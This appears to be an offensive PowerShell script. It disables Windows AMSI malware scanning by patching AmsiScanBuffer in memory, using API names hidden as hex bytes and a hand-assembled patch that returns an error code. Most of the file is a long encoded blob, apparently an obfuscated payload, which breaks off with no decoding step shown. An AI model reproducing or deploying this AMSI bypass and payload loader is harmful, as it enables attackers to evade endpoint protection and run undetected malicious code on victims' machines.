
$Win32 = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32
$test = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)
$LoadLibrary = [Win32]::LoadLibrary([System.Text.Encoding]::ASCII.GetString($test))
$test2 = [Byte[]] (0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)
$Address = [Win32]::GetProcAddress($LoadLibrary, [System.Text.Encoding]::ASCII.GetString($test2))
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)
#0:  31 c0                   xor    eax,eax
#2:  05 78 01 19 7f          add    eax,0x7f190178
#7:  05 df fe ed 00          add    eax,0xedfedf
#c:  c3                      ret 
#for ($i=0; $i -lt $Patch.Length;$i++){$Patch[$i] = $Patch[$i] -0x2}
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, $Patch.Length)

$enc = [system.Text.Encoding]::UTF8


$EncodedText = "c2B7dmF8ens1XHtjen5wOEZ9dGdlRmVndGwYH24YHxgfNTU1NU5WeHF5cGFXfHtxfHtyPTxIGB81
NTU1RXRndHg1PRgfNTU1NTU1NTVORXRndHhwYXBnPUV6ZnxhfHp7NSg1JTk1WHR7cXRhemdsNSg1
MWFnYHA8SBgfNTU1NTU1NTVOQ3R5fHF0YXBbemFbYHl5emdQeGVhbD08SBgfNTU1NTU1NTVORmFn
fHtySBgfNTU1NTU1NTUxVnp4eHR7cRgfGB81NTU1PBgfNTU1NTF3dGZwIyF3fHt0Z2woN0FDZERU
VFhUVFRUUFRUVFQ6Oi1UVFlyVFRUVFRUVFRURFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUclRUVFRUIXNgciFUYVR7W1x3cldBWCV9Q1J9ZXZsV2J2eCx7dnhT
YVxSW313eCBjcVZXfE9GV2xxQiFydEIhckdQLEFcUiRjT1JAYFFEJV5fVFRUVFRUVFRUV0RHRFRU
QVRQUVRbeCBaemJUVFRUVFRUVFRUWlRUXHJUWVRBVFRUVkRUVFRUXFRUVFRUVFRUcX5cVFRUVHJU
VFRUTFRUVFRUV1RUVFRyVFRUVFRyVFRXVFRUVFRUVFRUVFJUVFRUVFRUVFRUVnJUVFRUVHJUVFRU
VFRUVFhUTFxAVFRXVFRUV1RUVFRUVFBUVFRQVFRUVFRUVFRXVFRUVFRUVFRUVFRUVFRUVltWVFRX
RVRUVFRUUlRUVFliU1RUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRcVFRUVGJUVFRXYkREVFRaVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRc
VFRUVlRUVFRUVFRUVFRUVFRUVFZWVFRUUHJUVFRUVFRUVFRUVFRUVFYgJU9NfSVUVFRUc1ZcVFRU
VHJUVFRUX1RUVFRUXFRUVFRUVFRUVFRUVFRUVFRUVFZUVFRSVGB2e1tsTGJUVFRZYlNUVFRUTFRU
VFRUTFRUVFR4VFRUVFRUVFRUVFRUVFRUVFRUV1RUVFdUWXtfeXdSLH9UVFRYVFRUVFRcVFRUVFRW
VFRUVFlUVFRUVFRUVFRUVFRUVFRUVFRURFRUVERyVFRUVFRUVFRUVFRUVFRUVFRUVFRXTURyVFRU
VFRUVFByVFRUVFZUVEBUTFZyVFRXVE9UVFRRVFRcVFREVFRXclRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFdmYldEVFdXRFRUVERU
VFBNXFdUVFdiXlQtVFRUek1/R3pUVFRQeVN9LHZ7Qi1EVFRUXlZyTGFWJlxPVFRXYl5XUFRUVHpk
dm1cVFRUellTcmJCUUdEQVdXREFXR0xBV31MQVdtTEFWRmEnVH1QX3h7WVxUVFdiXldYVFRUemZW
clxHVkdxTHh9WFNeJExWUER4dHZgVFRUXVR6UGJUVFZ8Yl5UfVBfUyR8dFBiRGdFVFxHVk9lbC1U
VFR2VnJBVFRUXllULVZQRH5NQl96elNUVFRWfVhSXm0lVlBEeHR2clRXVF1UelBiVFRWfGJbVH1Q
X1MkfHReV0RUVFR6QVdtUF9TJHJBVkdQX1R6IGVYelhUdn1UV1RdVHpTRFRUVngtQlRUVF53bXZU
VFR6elJUVFRWe1hPVFRUXlBiekdWe1h0VFRUXl9NXHJURFdid21mVFRUenlcWnJRVFRXY11UVFRW
fENjXURUVFZ7WXFURFdid20hVFRUenhfR31jXWJUVFZ4LXJUVFReUGJmR1ZsbVdTfVhYXmwtXVBE
ZkdRUi19VFRUXndsXFRUVGVsJkRQVHZSLX9UVFReU3gtflRUVF5xV2ZUVFRTY19EVFRWfVBYUyRy
QVFXUFhQRGFjX3JUVFZ/WVJeYixsPmJQVHZWckdUVFReJkwhUVRUVF1aT1BUVFRUXXdsdlRUVHpB
UU1eclRyV2JQRCdYXURUVFRNWUxUcldiXlZyVFRUenpQRFRUVn1QXndsflRUVGVsXVRYVHZSLWRU
VFRed2xmVFRUZHldRFRUVEQkbFtyWFR2VHhYXURUVFRNXnJUYldiXlZyVFRUenpQRFRUVn1QXnds
flRUVGVsXVRYVHZSLWRUVFRed2xmVFRUZHldRFRUVERtbGVUWFR2VHxYXURUVFRNXnJUYldiXlZy
VFRUenpQRFRUVnxmRXZ9XFBUXVR6UERUVFZhJnpUclRUJn1UeHZmUFBUXVR6UERUVFZhJkJUclRU
dm1cVFRUenh2bVxUVFR6QVZXUFNZVyFHV0dwW1JyVFRURkBCXWxscXdsYlRUVHp6VERUVF5tWFxa
RSFUVFRUR1dWYn5QRERNf0d6VFRUUHlTfS1me0ItZlRUVF5eVFBUVFZmXF5UWFRUVExBVlF/QlRU
VFR2bVxUVFRlb1ByVFRWfVhaXlYhVFRUekFRbVxEUHItelliVFRWfVxFXlFUVFRUek1eUVBUVFR6
eVB9VENeUVxUVFR6elRyVFRXeC1vVFRUXndsQFRUVHp5UEdUelRyVFRXeC1vVFRUXndsQFRUVHp5
UH1UTV5RXFRUVHp6VHJUVFd4LW9UVFRed2xAVFRUekdRfVxEU0ZybFRUVF5QbVBGUE1fQFdEV2Je
UURUVFRlY19EVFRWfVBaUH1XbENUQFR2VnIlVFRUXndsQFRUVHpHUX1cRFNscmxUVFReUG1QRlBN
X0BXRFdiXlFEVFRUZWNfRFRUVnxyVlRUVGdQRCF6VHJUVF5sclFUVFRnXlRQVFRWZlxeVFhUVFRM
QVZXUFxZRGFsTXJAVHZWckdUVFReXntZdFdEV2JQRH1jX2JUVFZ6YnFUVFRXdnxMUlRdVHpeVFRU
VnxyR1RUVF52fyFSVF1UelBEVFRWfVBSU39QcXZlRFJUXVRHV3picVRUVFd2ZlRSVF1Uel5UVFRW
fHJHVFRUXl5iZWw6ckxUdlZyR1RUVF5QRH1jW2JUVFZ9WEZaV1RXVFRURlB8ciFUVFReUG1bbHJi
dlR2V1BBXldyVFRUenpQRFRUVnJxY1tiVFRWfVhAXiZERlNWciFUVFReUG1AQlBtTE1Xe1ggVFRU
XlBtdkdTbVBDUEdYTXdvelRUVHpBU2EhWFBHdmZXbVBNd29mVFRUZ3YmciV4dmRmXVRdVHpQRFRU
VmEhVFBHTGZSXVx7VlRXYlBHQ2x2RHJUdldQQV5RYlRUVHp6UERUVFZ9UFJTf1BfUERMekVEVFRW
fGZeXFpyUVRUVHpFRFRUVn1cQF5RIVRUVHphciwhWlB9QT5TclxUVFdhY1piVFRWYW1scWJyVHZX
UEFeV3JUVFR6elBEVFRWfVBdU39TX1BEcWZeUS1UVFR6QVJHXE9eUFRUVFRlZVBtfWxtYnJUdldQ
THdWfVdUVFReUG1+RlJGfVZUVFReUG16RlJ8fVFUVFRednIlX1RdVHpHVFRUVnxyR1RUVF5QR3J6
RURUVFZ9XEZeUSFUVFR6IyBFIjo6LCFaUH1ZPlNyXFRUV2FjWmJUVFZhbWxcRH5UdlZyR1RUVF5e
clRUVFBTLVRUVFRUVFRUYnJUVFRTcldUVFR0VHJUVFBUVFRUV1RUVFRQVlRUVFRUYkRUVFdUVFRU
VEFXVFRUUVRUVFRUVFRUVFRUVFRUVD5yWFRUVnZUVFRUfVdUVFRRRFRUVFdyVFRUUFZUVFRUIlRY
VFRcUFRUVFdhV1RUVFFyVFRUVFRUVFRUVlRUVFRtRFhUVFZYV1RUUXpXVFRUUXJUVFRUVFRUVFRB
WFREVCFEVFRUVFxUVFdQellyVFRWcnpGVEdcVF5WLVRUVHpNU2xybVRUVF5QclxGVFZyY1RUVF5S
Ry1AXlFQVFRUekZUbVxUXlYtVFRUenZdbUB6WERUVFZ9XFBQclR6WWJUVFZ9LV9dbUx6WERUVFZ9
XFNQclR6WWJUVFZ9LVhdbUB6WERUVFZyXF1eUEBUVFR6ZlFiXFxeUExUVFR6Zld7XldWRFdiXnJc
XF5QQFRUVHpmUWJcX15QTFRUVHpmV3teRVZEV2JeclxfXlBAVFRUemZQVFxHV1Z9UlRUVF5ZVE9s
e0R+VHZWelZQRER6R0RUVFZ8YkRUfVBTXlBMVFRUemZXe15nVkRXYl5yXEdXRn1TVFRUXllXTFZQ
clxNXlB2VFRUenpHclRUVnxiUnZ6UF9UXVRkU1Z6VFRUVHdYVFhUT1RQVFRUWFRUV1BWWkNcV1RU
V29QclRUVnJlb1ByVFRWcmZ6WXJUVFZyYl1Qcl9sYER+VHZWciVUVFRed2xAVFRUel1Qcl9sYER+
VHZWciVUVFRedmctX1RdVHpSVFRUVngteVRUVF5XbVxWdmZYX1RdVHpbVFRUVngteVRUVF5XbVxW
dmZYX1RdVHpbVFRUVnteOlZEV2JeV3JUVFRlY19EVFRWcnFsb0R+VHZSLXlUVFReVyZZR1ZEV2J3
bEBUVFR6XXZhQF9UXVdjX0RUVFZycWwnRH5UdlIteVRUVF5XJllzVkRXYndsQFRUVHpddmBAX1Rd
V2NfRFRUVnJxbCNiflR2Ui15VFRUXlcmWW9WRFdid2xAVFRUel12YyVfVF1XY19EVFRWcnFsV2J6
VHZSLXlUVFReVHgtJlRUVF5RRmFGUHJYelpUVFRWfVhQVyctJlRUVF5QYkBnX31cU15RclRUVHpB
V31QUFBETHpSVFRUVn1YXVBEcWNGVFRUVnJYbFZUTEdXJy15VFRUXlByQHpFclRUVnwmRyZyIUZX
cyFCVHJUVFInLSJUVFReJldcUV5RIVRUVHphZXEhWlByRT5TclxUVFdhY1piVFRWYWJSXntcQVZy
V2JeV1BUVFR6QF5yUHZUVFRWVEViVFhsLVdRclRUVFRUVlRaflRNJXJXUXJUVFRUVHBUfH1fVFRU
Xl5+X0FGflxXVFRQVFRUVFRUVGJUVFRXJ1tWIWJZf1hiWG9QIFRUVFRUVEBUd1RUVFRdVFBUVFR/
c3JUVCZURFRUXnJSVFRUf0AmR2x0QiB7dmJUVFRUVlBWYlRUYVR6VFRWW0NAYlQhU3JUVFBUVFRU
VltdQ0B5UFRUVFRGV0xUVFhyVlRUVH9EeG1jTHJUVFRUVFRUVFRWVFRUV0dtQFZWVH5cVFRUVD5y
UG9UV0xUVFRQVFRUVGBUVFRUVHJUVFRURFRUVFRQVFRUVEZEVFRUVCFUVFRUUVRUVFRUclRUVFRQ
VFRUVFNUVFRUVGJUVFRUVFRnYlxXVFRUVFRUVFJUV3pWLWJEUlRcdlYtYkRSVFAhV3xUREVUVmJT
VFRUUlRdTFd2VFhSVEUlV3ZUWFJUWyFXdlRYUlRSIVZ2VFhSVFF6VnZUWFJUU1hWdlRYUlRcJVd2
VFhSVFJcVyRURFJUUFRXJFREUlRYUFd2VFhSVF5yVyZUXFJUXn5TQmJYUlRULVRZclReVFxmUlBi
QF5UWVBRUGJAUlRYIVRCYltdVFNyUFRUVFpUUWJSb1RAUlRSXFFCYlhaVFpQUW9UQFJURXZTQmJY
UlRWWFBCYlhSVEVyVkJiWFJUWSVUQmJYUlRXTFRCYlheVFZiV0xyTF5UUEBQTHJMXlRWclBQYkBG
VF5UUXREVF5UWkBUUGJAXlRZLVNQYkBeVFhyUVBiQF5UXFxRUGJAXlRYIVFQYkBeVFxyUVBiQEJU
Xy1UUXJEUlRUUFRZclRaVEVQVG9UQFpUXHpTb1RAUlReelRCYlhSVFB+VGxiXFJUWUxUQmJYVFRU
VFRdVFRUVFRUVFREVFdUVFBUUFRXTVd5dlJERFRXVFRQVEBWVFRUVFRUeXJXZ1QteldURFF2X0RU
VFRUVkJURSFRJVRQVlRYYnhUVFRUVF9MVGJyQUJURFhUQlZyVFRUVFR9fXxWV1RMVFdEVFRUVFBU
T2JAVFRUUFRTYlBUVFRQVFxiTFRUVFxUVnJYX1RcXFBURFRHVFxcUFdyVE9UXFxQVnJUZVRcXFBQ
VFRtVFxcUFBUVCBUXFxQUFRXV1RcXFBQVFdfVFxcUFBUV0dUXFxQUFRXT1RcXFBQVFd9VFxcUFNE
V2VUXFxQUFRXbVRcXFBQVFcgVFxcUFBUUV9UXHJUQGJRT1RXflJCVFF9VFt2VE1yVFhUXFxQV3JR
T1RfelJ0RFFlVFdQV3diUW1UV2JXcVRRbVRSWFBwRFEgVFhAVHNyUU9UXlxTcnJWR1RcXFBQVFRX
VExcUHxUVFdUQXpQUFRUV1R3IVZURFRXVENUVH9yVF9UQkBUeVRUV1RwUFR4RFRXVEB6UXpUVk9U
U1xRZURUT1RBZlNnVFR9VENcUWZyVGVUQ1xRYERUWFRSQFRjclZPVFQtUm1UVFhUVC1SbVRRT1Re
XFNsVFZHVFFmU29iVG1UQ1xRJERUIFR0QFYmVFFPVFl+UyFUV1dURmJSIGJWfVRQJVI6VFZ9VFd6
UG1UVn1UV3ZRbVRWfVRcXFBURFJ9VFJiU1ZUUldURUxWc3JWfVRFTFZRclNXVHdUU1BiU1dUdFxT
X0RQWFRTQFBFclBAVFRYUkFEUm1UXFxQQHJSbVRdTFNCclN9VER+V1dyUU9UXlxTTGJTZVREclB0
YlBAVFFYUnZUUiBUU2ZTcVRSIFRfZlBwclIgVFlQUHFUUiBUUHpTcHJTbVRzTFZzclFPVF5cU3Ny
Un1UVlBReVRSfVRRdlF5VFJ9VF9+U1ZUXU9URS1WbVRWV1RcXFBXclRgVFRmVCBUUGBUV1hUIkRQ
YFRXZlRRVFxgVFZYVFNEXGBUVmZUX0RcYFRRWFRfRFxgVFFmVF9EXGBUUFhUU0RcYFRQZlReYlxg
VFNYVF9EXGBUU2ZUX0RcYFRSWFREYlxgVFJmVHdEXGBUXVhUcHJcdFRcQFd7VFN/VFB2V1dcVFRU
VFBUVFRUVFRUVFRUVFRUVFRUVENiTFRUVERUVFRUVFRUVFRUVFRUVFlyV19EVFRUVFRUV1RUVFRU
VFRUVFRUVFRUVGJEUEFXRFRUVFRUUFRUVFRUVFRUVFRUVFRUViFUdmJTVFRUVFRURFRUVFRUVFRU
VFRUVFRUWXJXQmJYVFRUVFRXVFRUVFRUVFRUVFRUVFRUYFRdLFRUVFRUVFd3VEVyVHRiUSFUUiVU
PlRUVFRUVFRUUHlTd3tDYU9NX31MeG15TFFQVEFSeW9xUlRtVFB5YHFRWGxUUW1bdydHJHdSQD5U
UiRvTCcsbHdSeXxUU1sgdiZHeXdGIFF3J21mT0JbJXRCLGB2bCBdT0IgeXZ4eX9UU0d6dnhDfU9U
V3tPTUdzQF1fY3ZSQ2xxUnl5diRHY0FSLH1PVFdXT1JEVEAmeW9xUkNhWX5bY3dSbXlMJkdldycg
b1l5W2JPQltlTEJtZXB4Q35UUHF5cVBDYHF4eWx3JyBhT0IgJUN4U2x0QlN8d1JAVEdCICR3QkNs
TEJfZk9EV19HUnlvdlIsb0xCX2ZPRFdQdyZDfHdSQFREJyxgdicsZk9EV3tPTUdzQXhTYU9EV1BM
TUd5Q1J5YU9EV012eHklT0BtZXd4QFR2J0MlTSRbeUxNX390U1t/dyZXeVRQW2N3e0d5cF1HQHBN
V3lUU1sgdiZHeXdGIFF3Jl95VFBHZXYmV2N2J0BUQFJTbHYnQFRHUlMlT0RXXU9NR1F3JyRicU1H
eXZ5W2VxUkBUREJbJXRNT3lHUnlsT0JbJXcmXyBAJ3klT0RXXXFCeX5ETUcldnh5fHFNR3lUUEd5
THtDe08nU3x3UkNXcV1HbHRCXyRxUkBURCcsYUN4eW90Ql9mT0BTJXFdX2VMe0MlT0RXV3YmW3l3
Ql9mcENHZXFSbXlETUcldnh5fHFNR3lUUFNvdidDYUx4bSBDXV99T1JDYUxNX2dETUcldnh5fHFN
R3lUU0d9dnhxeXFQT2xMQiR5cScsbHQlUyVxXV9lTHtDJU9EV1d2Jlt5d0JfZnBAT2V3UkNCT01f
b3RCLGBETUcldnh5fHFNR3lUUFNvdidDYUx4bSBEJyxgT3h5e3FNX31xUnljd35TJXFdX2VMe0Ml
T0RXV3YmW3l3Ql9mcEBHeXYnW2x0TVcldEIsYERNRyV2eHl8cU1HeVRQW2N3TVdld1JTJXRCLGBA
eENmTE19fXFSeWN3e1tXcV1HbHRCXyRxUkBURE1bb09CJHx3XXlEdngsfnFCWyVETUcldnh5fHFN
R3lUUFNvdidDYUx4bSBEJyxicE1fZU8nfSVETUcldnh5fHFNR3lUUFNvdidDYUx4bSBEJyxhdlJT
YHBAUyVxXV9lTHtDJU9EV0ZxQiAldEIkeUQnLGF2UlMldEJfZXdSeSVwQFMlcV1fZUx7QyVPRFd7
T01Hc0N4U2ZxQkBUQCd9fXZ7V0F2XV99cEYgeXBSQFR2J0MlTSRXfU8nQ0F0TWV5VFNbIHYmR3l3
RiBAdF1feUxCR2V3eHZUQCZ5b3FSQ2FZeV8kd3tHZXdCQGBDeENsdid5Y3d4eWBPYldAdyRbJXZ4
eWBPYld7T01Hc0FSQ2BPJkd6VFIkZXd5VyZPUG15d3hxJXRUV3tPTUdzQUIsYHFSclR3JldzRyZf
eUxNR3l2eUd6TEIgRXZ+Q21xQlNmVFIsYk0lbXl2JltAdFJTYEEmX1N2TUN9d1RXUnRCIH5EQm1m
VFJxeXFTLF9xUkNhVFNbIHYmR3l3RFdAdEIkeUAmV313cldbTEJ5YFRTWyB2Jkd5d0YgRk9CT2ZP
QlsldEIsYFRTX3l2JkNmcVNXbHcmV3l2e0cgQ3hTZnFCQ1F3J21mT0JbJXRCLGBUU1sldnh5YE8l
W2N3Um15TCZHZXcnIVRAJ0N9dnhbekB4Q29xQm0lRCcsZndSQ39xUnljd3JXRk9NWyR3XUdEdngs
Yk9NXyVwQFtjd1JteUwmR2V3JyFUQF1fZXd4W2V2UlNmQCdDbHF4Q2xHUiwmd35DIUwnQ2JxUnlj
d3JXXU9NR0FPQlNvdychVEAnbXlPTVRUQCZ5b3FSQ2FZfm1ld3tQVE8nQyVNJHl5TE1cVEQnfX12
cldQdE1feUwmR2N2e3lBT0JTbEwnfXl2cldvT01Hc0d4eWZxUkNsVFBHZXZ4Q39xUixscENbeXZ7
T3l2clddT01HU3d7Q2FPTV99cVIsbFRScXlxUyxfd3tHeXZ5W2VxUkNAdyZXY3dSLHtwQHF5d3hD
bExNR2N2clRgTCZHY3ZyV0FwTVslT0IlYEdSeX1PJyBjdiZHZUwmWFRPJ0MlTSRHY3FSU2ZBQnlm
d1J5b09CW2N3eEdvVFBPbHcnJFt0Qm1mdE1beUwnLGBPXVhURydDYE9NX31xUkNETE1bb3EnLGxP
XVhUQCZ5b3FSQ2FZeV8kd3tHZXdCQGBGQiAlT01fY3ZTW3l2e09lTCdDb1RTWyB2Jkd5d0YgRnFC
ICV0QiR5WX5bY3dNV2V3UkNsQCdDbHF4eX9PTVhUQCZ5b3FSQ2FZfkdldnhDf3FSLGxwQ1t5dntP
ZUwnQ29UUEd5THtDe08neWBPJSRjT1JDb1RScXlxUyxEdngsYk9NXyV0QkNvVFJxeXFTLEB3Jkd9
d1AkZXd7QyVPTVhUR3tfY3dAJGV3e0MlT01YVExNX3t2YldXT1JHW3cnICV0XVhUQ3hTZnRCR31x
UkNRdnhDfk9CICV0QlNmdmJXUXcnICVPTX0lQSZXJXRCLGB2YldXT1JHT09CU2x2YldRdycgf0xN
RFRBJ19kT0JbJVRQR2V2Jkdld3hbJVRTW2J3UnklVFNbeUxNX390U195diZDZnFUV0FwTVslT0Il
YEdSeWxPQlsldyZfIEAnQ2xxeHl/T01YYERCW393JkNgcVAkfXd4U3tPQiR5d3tEVEdCICd0TV9j
d3gkeXd7RFRPJ0MlTSVbJHZ7X3l3e0RUTydDJU0lW2NxQiAlVFNHbHRCJEFxUlNscVRXQU9CQ35B
UnlvcVRXQHclbWV2JkRUQUIsJ09AIHlwXURUQF1fZXd4W2V2UlNmRCcsYHFSQyFxVFd7T01Hc0NS
LH5MTX5UQCd9fXZ7V0F2XV99cERXQXBNWyVPQiVgR1J5bE9CWyV3Jl8gQCdDbHF4eX9PTVhgREJb
JXRNT3lHUnlsT0JbJXcmXyBUUEdldnhDf3FSLGxwQENgcV1fIFRSLGJNJUNtcUJTZnRNRyBUVFRU
VFdxWFRQLVRHYldFVFAhVEBiV1NUU1xUQ3JXU1RTXFRUXFZhQmJUYVRTJVRcVFdSVFJQVHREV2ZU
UkBUT1RUclRdRFR3YlRyVF1cVE9EVyVUXVxUdERXeVRdTFRPRFRyVF1EVHRUV3lUVlRUQVRXRVRQ
dlRBYldaVFNYVEdEV0ZUU0xUR0RXRlRWVFRxVFd6VFJAVFxUV3lUUiFUcXJXZVRdXFR3YldgVFIl
VE9EV2BUXURUXFRXJ1RSUFR2cldlVFJQVExyV2ZUUkBUWmJUclRdRFR0VFd5VFZUVHZiV39UXVxU
dERXYlRdRFRcVFcmVFJ+VHdUV2ZUVlRUT0RXIVRSflRxVFRgVFRQTVlEVGFUU1RUTERXb1RdWFRx
YldjVF1cVE9UV29UVFBFWURUYVRTWFRPRFd5VFJEVHZiVFdRbCVUWURXUFRSQFR3VFd9VF1+VFRE
LWFUViVUQGJXZlRSQFRPRFdiVFRQRUFUV1BUUFBUQFRUI1RWLVRZYlRUcllmelRWTFReVFdjVFJc
VHRyV3lUUlhUcVRXUVRSUFRxVFd5VFJ2VHdiV2xUXX5URURXRFRSQFR2cldvVFItVHdyVGVUVnJU
dmJXV1RQJVRERFd/VFJYVHdiVyRUUiFUcVRXWlRSUFR3RFd5VFElVF5yVGVUVnJUXERUelRdQFR2
Yld5VF1cVEREV39UUlhUd2JXJFRSIVRxVFdRVFItVHdyVyVUXVxUd2JXZlRRelRYRFRgVFFcVFly
VCFUUURUWFRUYFRRUFRYRFRvVFFAVFtEVCdUViFUWERUYFRRRFRZclQhVFFUVFhiVCNUUSVUWHJU
ZVRWflReRFRUXU1YVEREV1tUUFBUTGJXf1RSLVRxRFdgVF1EVEFyV31UUiVUT0RUVHJeW3dUViVU
TURUclRQTFRMRFdlVFJiVE9EV35UVlRUcVRXY1RWVFR2cld5VF1EVHZyV2VUUkBUcXJXeVRWVFRx
VFd6VFJAVFxUVyRUXVhUT0RXbFRSIVRMRFdhVFJAVHZiVHJUUkxUdnJXY1RSJVRcVFdXVFJYVHFU
V2VUXUxUT0RUclRQRFR0RFdsVFJAVExiVyVUUi1UdnJXIFRRZlRcVFclVFJyVE9EVHJUXVhUTGJX
bFRSflR2VFclVFZUVHFiV2VUUmJUd1RUclRSQFRwVFdlVF1EVFlyVFdbJGZUXmJXcVRWVFRAYlck
VFJYVExiV3lUXVhUdmJXeFRdQFR3VFdmVF1+VFxUV39UUi1Ud1RXZlRSQFRMYlclVFJAVE9UVHJU
VFdRXFRXJFRdWFRPRFdsVFIhVExEV2FUUkBUdmJUclRSTFR2cldjVFIlVFxUV1dUUlhUcVRXZVRd
TFRPRFRyVFBEVHREV2xUUkBUTGJXJVRSLVR2clcgVFYhVFRXeWFUUn5Ud3JXRFRddlRPVFdYVFJA
VHdyV3tUXURUdFRUVHRDZlRecldxVFZUVENUV3pUUkBUXFRXWFRSLVRMYldnVFItVHFEVyVUVlRU
Q1RXelRdXFRPRFdvVFJyVHdiV2ZUUkRUXFRXeFRSLVR2clRyVF1EVHRUV3lUVlRUTGJXJFRdXFR2
cld5VFIhVHFUVHJUUkRUd2JXYVRSUFR0RFdgVFZUVHREV29UVlRUVFRYYFRUV2FCYlRkVFMlVFxU
V0BUUnJUT0RUclRQJVR0RFdgVFZUVEBUV31UXVhUdmJXJlRSLVR2cld+VFZUVEFUV3lUUiFUT2JX
JVRSclRcVFd4VFItVHZyVHJUXURUdFRXeVRWVFRMYlckVF1cVHZyV3lUUiFUcVRUclRSRFR3Yldh
VFJQVHREV2BUVlRUdERXb1RWVFRUXFZhQmJUYVRTJVRcVFdSVFJQVHREV2ZUUkBUT1RUclRdRFR3
YlRyVFJYVHZyV3lUUlBUcVRXeVRWVFRMRFRyVFJiVHREV29UXURUXFRXJVRSclRPRFRyVF1AVHZi
V3lUXVxUd3JXfVRSJVRPRFdvVFZUVE9yV2xUUi1Ud0RUclRQUFRMYlclVFJ+VHFyV3lUVlRUR1RX
ZVRdXFRPRFd/VF1EVHdiV2xUXX5UWmJUclRdRFR0VFd5VFZUVHZiV39UXVxUdERXYlRdRFRcVFcm
VFJ+VHdUV2ZUVlRUT0RXIVRSflRxVFRgVFRSVH5DZlRZRFdxVFZUVEdyV31UUn5Ud1RXeVRSRFRc
VFclVFItVFxUV3hUUn5Ud3JXflRWVFR3YldsVFZUVExiV2NUUiFUd3JXeVRSWFRxVFRyVF1EVHdi
VHJUUFBUTGJXJVRSflRxcld5VFZUVEdUV2VUXVxUT0RXf1RdRFR3YldsVF1+VFpiVHJUXURUdFRX
eVRWVFR2Yld/VF1cVHREV2JUXURUXFRXJlRSflR3VFdmVFZUVE9EVyFUUn5UcVRUYFRUUF9BRFdb
VFAlVEFEVFRwJGZUWURXcVRWVFRDVFd6VFJAVFxUV0RUUlBUdmJXb1RddlR3YldsVFJEVEFUV2VU
XVhUcVRUclRdTFRMRFdsVFJ+VExEV3xUUmJUT0RUclRSflR2YlRyVFJAVHdEV2JUXURUcERUIlRW
VFRxVFd6VFJAVFxUV29UUlhUdnJXZVRdVFRxVFRyVF12VHREV2ZUUmJUXFRXeVRdclR0RFclVFYh
VFRAYXdUVmZUTURUclRTWFRxRFd/VFJYVE9EV29UXVhUT3JXJFRSYlR3VFcgVFZUVE9iV3lUUiFU
T0RXbFRSUFRxVFd5VFJEVFxUV31UVlRUd1RXZVRdWFRxVFRyVFItVE9yVHJUVFRNXFRXYlRSUFR2
YldvVF12VHdiV2xUUkRUdmJUYFRUV0NCYlRkVFMlVFxUV0FUXURUTERXbFRdRFR0RFdgVFJ2VFxU
V2JUUlBUdmJXb1RddlR3YldsVFJEVFxUV29UXVRUdnJXfVRdflR0RFdgVFJ2VFxUV2NUXVRUT0RX
bFRSUFRxVFdlVFItVHdyV29UViFUVFZhd1RWelRNRFRyVFNAVHZiV2VUUiFUT2JUclRSUFRcVFd+
VFJAVHdUV31UXX5UXFRXY1RSTFRcVFRURUZUVHdEV2VUUmJUd1RXZVRdWFRPRFdjVFIhVE9UV29U
VlRUTHJXeVRdRFRxYld5VFJAVHdyVHJUUlBUcVRXJVRSQFR3RFdiVF1EVHZiVGBUVFZUciRmVF5y
V3FUVlRUQ0RXb1RSflR3cld7VFZUVHFUV3pUUkBUXFRXflRSQFRPcld9VF1AVHdUVyVUVlRUT1RX
eVRSYlRMRFcgVFZUVHdiV3hUVlRUWERUYlRRVFRYVFRyVFIlVHREV2ZUUmJUdERXb1RSQFR3Yldg
VFJEVHZiVHJUUlxUT0RXJVRddlRPRFd5VFIhVFxUV31UXURUcVRXeVRSJVR2VFclVF1YVFlyVFRf
JGZUXnJXcVRWVFRDRFdvVFJ+VHdyV3tUVlRUdlRXfVRdWFR2YlcmVFItVHZyV35UVlRUVF1hd1RW
JVRNRFRyVFBMVExEV2VUUmJUT0RXflRWVFRxVFdjVFZUVHZyV3lUXURUdnJXZVRSQFRxcld5VFZU
VHFUV3pUUkBUXFRXflRSLVR3RFd9VFJ+VHdyVHJUUiFUTERXYVRSQFRaYlRyVF1EVHRUV3lUVlRU
dmJXf1RdXFR0RFdiVF1EVFxUVyZUUn5Ud1RXZlRWVFRPRFchVFJ+VHFUVGBUVFNfQmJUZ1RTJVRc
VFdBVF1AVExiV39UUkBUdmJXb1RSTFRxRFdmVFJiVHBEVHJUUlBUcURXJVRSclRPRFdgVF1EVHRE
V39UUlBUcVRXeVRSRFRcVFcmVFJ+VHFUV3pUVlRUVFRAI1RRelRUUCx3VFZ6VE1EVHJUUFhUd2JX
YVRdVFR3VFd5VF1EVE9EV35UVlRUTERXZlRSYlRcVFdsVFItVHFEV2BUUkRUdmJUclRddlR0RFcl
VFJyVFxUV2JUUlBUdmJXb1RddlR3YldsVFJEVFxUVFRHQ2ZUXnJXcVRWVFRBcldjVF12VFxUVyVU
UnJUT0RUclRdWFRMYldsVFJ+VHZUVyVUVlRUcWJXZVRSYlR3VFRyVF1YVHdUV3lUUkBUdlRUclRS
TFR3YldsVFZUVFRXWHJUUiVUdERXYFRdQFRxVFd5VF1YVFlyVFRNJGZUXnJXcVRWVFREYldjVFIl
